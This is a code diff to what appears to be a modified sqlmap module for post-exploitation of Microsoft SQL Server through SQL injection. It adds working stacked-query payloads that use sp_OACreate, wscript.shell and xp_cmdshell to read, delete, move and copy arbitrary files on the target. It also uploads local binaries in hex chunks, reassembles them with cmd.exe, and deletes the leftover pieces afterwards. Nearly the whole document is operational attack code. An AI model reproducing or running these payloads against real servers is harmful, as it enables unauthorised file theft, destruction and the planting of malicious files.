@@ -9,6 +9,8 @@ import ntpath
 import os
 
 import binascii
+from lib.core.common import flattenValue
+from lib.core.common import isListLike
 from lib.core.enums import DBMS
 from lib.core.common import Backend
 from lib.core.common import checkFile
@@ -203,8 +205,6 @@ class Filesystem(GenericFilesystem):
 
         binToHexQuery = binToHexQuery.replace("    ", "").replace("\n", " ")
         inject.goStacked(binToHexQuery)
-        #result111 = inject.getValue("select (char(94)+char(94)+char(33)+cast((select data from ssqlinjection1) as varchar(8000))+char(33)+char(94)+char(94))")
-
         if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
             result = inject.getValue("SELECT %s FROM %s ORDER BY id ASC" % (self.tblField, hexTbl), resumeValue=False, blind=False, time=False, error=False)
 
@@ -271,11 +271,106 @@ class Filesystem(GenericFilesystem):
 
         self.execCmd(" & ".join(command for command in commands))
 
+    def oleDelFile(self,path_name):
+        inject.goStacked('declare @result int;declare @ffffffff0x int;exec sp_oacreate \'scripting.filesystemobject\', @ffffffff0x out;exec sp_oamethod @ffffffff0x,\'deletefile\',null,\'{path_name}\';exec sp_oadestroy @ffffffff0x'.format(path_name=path_name))
+        print('delete file may be success')
+        print('已执行文件删除命令，请自行判断是否成功，用户在目标目录无修改权限会执行失败')
+
+    def oleMoveFile(self,path_name1,path_name2):
+        inject.goStacked(
+            'declare @ffffffff0x int;exec sp_oacreate \'scripting.filesystemobject\',@ffffffff0x out;exec sp_oamethod @ffffffff0x,\'movefile\',null,\'{path_name1}\',\'{path_name2}\';'.format(
+            path_name1=path_name1, path_name2=path_name2))
+        print('move file may be success')
+        print('已执行文件移动命令，请自行判断是否成功，用户在目标目录无修改权限会执行失败')
+
+    def oleCopyFile(self,path_name1,path_name2):
+        inject.goStacked(
+            'declare @ffffffff0x int;exec sp_oacreate \'scripting.filesystemobject\', @ffffffff0x out;exec sp_oamethod @ffffffff0x,\'copyfile\',null,\'{path_name1}\',\'{path_name2}\';'.format(
+                path_name1=path_name1,path_name2=path_name2))
+        print('copy file may be success')
+        print('已执行文件复制命令，请自行判断是否成功，用户在目标目录无修改权限会执行失败')
+
+    def oleReadFile(self,path_name):
+        self.tblField = 'data'
+        activate = getSQLSnippet(DBMS.MSSQL, "activate_sp_oacreate")
+        inject.goStacked(agent.runAsDBMSUser(activate))
+        output = None
+        hexTbl = "%s%shex" % (self.fileTblName, randomStr())
+        inject.goStacked("DROP TABLE %s" % hexTbl)
+        inject.goStacked(
+            "declare @object int;declare @file int;declare @data varchar(8000);exec [master]..[sp_oacreate] 'scripting.filesystemobject',@object out;exec [master]..[sp_oamethod] @object,'OpenTextFile',@file output,'{path_name}';create table {hexTbl}(data varchar(8000));exec [master]..[sp_oamethod] @file,'read',@data out,8000;insert into {hexTbl}(data) values(@data);".format(
+                hexTbl=hexTbl,path_name=path_name) )
+
+        query = "SELECT %s FROM %s" % (self.tblField, hexTbl)
+
+        # 有回显注入直接从回显注入里面查询
+        if any(isTechniqueAvailable(_) for _ in
+               (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:
+            output = inject.getValue(query, resumeValue=False, blind=False, time=False)
+
+            if output :
+                print("读取的文件内容：" + output)
+
+
+        if (output is None) or len(output) == 0 or output[0] is None:
+            output = []
+
+            count = inject.getValue("SELECT COUNT(*) FROM %s" % (hexTbl), resumeValue=False, expected=EXPECTED.INT,
+                                    charsetType=CHARSET_TYPE.DIGITS)
+
+            if isNumPosStrValue(count):
+                for index in getLimitRange(count):
+                    query = agent.limitQuery(index, query, self.tblField)
+                    # 获取最终的输出
+                    output.append(inject.getValue(query, union=False, error=False, resumeValue=False))
+
+        inject.goStacked("DELETE FROM %s" % hexTbl)
+        inject.goStacked("DROP TABLE %s" % hexTbl)
+        if output and isListLike(output) and len(output) > 1:
+            _ = ""
+            lines = [line for line in flattenValue(output) if line is not None]
+
+            for i in xrange(len(lines)):
+                line = lines[i] or ""
+                if line is None or i in (0, len(lines) - 1) and not line.strip():
+                    continue
+                _ += "%s\n" % line
+
+            output = _.rstrip('\n')
+
+        return output
+
+    def xpCheckFile(self,path_name):
+        self.tblField = 'data'
+        output = None
+        count = 0
+        hexTbl = "%s%shex" % (self.fileTblName, randomStr())
+        inject.goStacked('declare @result int=0;declare @path nvarchar(200)=\'{path_name}\';EXEC master.dbo.xp_fileexist @path ,@result output;create table {table_name}(data varchar(8000));insert into {table_name}(data) values(@result);'.format(table_name=hexTbl,path_name=path_name))
+        query = "SELECT %s FROM %s" % (self.tblField, hexTbl)
+        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:
+            output = inject.getValue(query, resumeValue=False, blind=False, time=False)
+
+        if (output is None) or len(output) == 0 or output[0] is None:
+            output = []
+            count = inject.getValue("SELECT COUNT(*) FROM %s" % (hexTbl), resumeValue=False, expected=EXPECTED.INT,
+                                    charsetType=CHARSET_TYPE.DIGITS)
+
+        inject.goStacked("DELETE FROM %s" % hexTbl)
+        inject.goStacked("DROP TABLE %s" % hexTbl)
+
+        if output == '1' or str(count) == '1':
+            print('Target file exists')
+            print("目标文件存在")
+        else:
+            print('The target file does not exist')
+            print("目标文件不存在")
+
+        return
+
 
     def xpCmdUpload(self,localFile,remoteFile):
-        print('Local File: '+localFile)
-        print('Remote File: '+remoteFile)
-        print("please wait......................")
+        print('Local File Path : '+localFile)
+        print('Remote File Path : '+remoteFile)
         checkFile(localFile)
         file = open(localFile, "rb")
 
@@ -296,69 +391,62 @@ class Filesystem(GenericFilesystem):
         payload4 = 'del /f "{}"'.format(remoteFile.replace("/", "\\") + '.tmp')
         inject.goStacked('DECLARE @bjxl VARCHAR(8000);SET @bjxl=0x%s;EXEC master..xp_cmdshell @bjxl' % binascii.hexlify(
             payload4.encode()).decode())
-        print('Uploaded successfully!')
+        print('The file upload process has ended. You can use --check-file to determine if the upload was successful')
+        print('文件上传流程结束，可使用--check-file判断上传是否成功')
 
-    def oleUpload(self,localFile):
+    def oleUpload(self,localFile,remoteFile):
         print('Local File: '+localFile)
-        cmd = getSQLSnippet(DBMS.MSSQL, "activate_sp_oacreate")
-        inject.goStacked(agent.runAsDBMSUser(cmd))
-        print("please wait......................")
+        print('Remote File: ' + remoteFile)
         checkFile(localFile)
         s = open(localFile, 'rb').read()
         content = binascii.hexlify(s).decode()
 
-        localFile = localFile.split('/')[-1]
 
         l = [content[i:i + 150000] for i in range(0, len(content), 150000)]
         print(len(l))
         if conf.method == HTTPMETHOD.POST:
             for n, i in enumerate(l):
                 inject.goStacked(
-                    "DECLARE @ObjectToken INT;EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT;""EXEC sp_OASetProperty @ObjectToken, 'Type', 1;EXEC sp_OAMethod @ObjectToken, 'Open';""EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x{content};EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL, ""'c:\\windows\\tasks\\{localFile}', 2;EXEC sp_OAMethod @ObjectToken, 'Close';EXEC sp_OADestroy @ObjectToken;".format(
-                        index=n, content=i, localFile=localFile))
-            print('Uploaded successfully!')
+                    "DECLARE @ObjectToken INT;EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT;""EXEC sp_OASetProperty @ObjectToken, 'Type', 1;EXEC sp_OAMethod @ObjectToken, 'Open';""EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x{content};EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL, ""'{remoteFile}', 2;EXEC sp_OAMethod @ObjectToken, 'Close';EXEC sp_OADestroy @ObjectToken;".format(
+                        index=n, content=i, remoteFile=remoteFile))
+
+            print('The file upload process has ended. You can use --check-file to determine if the upload was successful')
+            print('文件上传流程结束，可使用--check-file判断上传是否成功')
             return
         l = [content[i:i + 256] for i in range(0, len(content), 256)]
         for n, i in enumerate(l):
             inject.goStacked(
-                "DECLARE @ObjectToken INT;EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT;""EXEC sp_OASetProperty @ObjectToken, 'Type', 1;EXEC sp_OAMethod @ObjectToken, 'Open';""EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x{content};EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL, ""'c:\\windows\\tasks\\{localFile}_{index}', 2;EXEC sp_OAMethod @ObjectToken, 'Close';EXEC sp_OADestroy @ObjectToken;".format(
-                    index=n, content=i, localFile=localFile))
-        # print('copy /b {} {}'.format(
-        #     '+'.join(['c:\\windows\\tasks\\{}_{}'.format(localFile, i) for i in range(len(l))]),
-        #     'c:\\windows\\tasks\\' + localFile
-        # ))
+                "DECLARE @ObjectToken INT;EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT;""EXEC sp_OASetProperty @ObjectToken, 'Type', 1;EXEC sp_OAMethod @ObjectToken, 'Open';""EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x{content};EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL, ""'{remoteFile}_{index}', 2;EXEC sp_OAMethod @ObjectToken, 'Close';EXEC sp_OADestroy @ObjectToken;".format(
+                    index=n, content=i, remoteFile=remoteFile))
 
-        # 拆分文件
         for i in range(len(l) - 2):
 
             if i == 0:
                 inject.goStacked(
-                    "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c copy /b c:\\windows\\tasks\\{}_{}+c:\\windows\\tasks\\{}_{} c:\\windows\\tasks\\{}_{}_tmp'".format(
-                        localFile, i, localFile, i + 1, localFile, i + 1
+                    "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c copy /b {}_{}+{}_{} {}_{}_tmp'".format(
+                        remoteFile, i, remoteFile, i + 1, remoteFile, i + 1
                     ))
             else:
                 inject.goStacked(
-                    "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c copy /b c:\\windows\\tasks\\{}_{}_tmp+c:\\windows\\tasks\\{}_{} c:\\windows\\tasks\\{}_{}_tmp'".format(
-                        localFile, i, localFile, i + 1, localFile, i + 1
+                    "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c copy /b {}_{}_tmp+{}_{} {}_{}_tmp'".format(
+                        remoteFile, i, remoteFile, i + 1, remoteFile, i + 1
                     ))
 
-        # 合并文件
         if len(l) > 2:
             inject.goStacked(
-                "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c copy /b c:\\windows\\tasks\\{}_{}_tmp+c:\\windows\\tasks\\{}_{} c:\\windows\\tasks\\{}'".format(
-                    localFile, len(l) - 2, localFile, len(l) - 1, localFile
+                "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c copy /b {}_{}_tmp+{}_{} {}'".format(
+                    remoteFile, len(l) - 2, remoteFile, len(l) - 1, remoteFile
                 ))
         else:
             inject.goStacked(
-                "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c copy /b c:\\windows\\tasks\\{}_{}_tmp+c:\\windows\\tasks\\{}_{} c:\\windows\\tasks\\{}'".format(
-                    localFile, len(l) - 1, localFile, len(l), localFile
+                "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c copy /b {}_{}_tmp+{}_{} {}'".format(
+                    remoteFile, len(l) - 1, remoteFile, len(l), remoteFile
                 ))
 
-        # 清理痕迹
         inject.goStacked(
-            "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c del c:\\windows\\tasks\\{}_*'".format( localFile))
-
-        print('Uploaded successfully!')
+            "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c del {}_*'".format(remoteFile))
+        print('The file upload process has ended. You can use --check-file to determine if the upload was successful')
+        print('文件上传流程结束，可使用--check-file判断上传是否成功')
 
     def _stackedWriteFileDebugExe(self, tmpPath, localFile, localFileContent, remoteFile, fileType):
         infoMsg = "using debug.exe to write the %s " % fileType
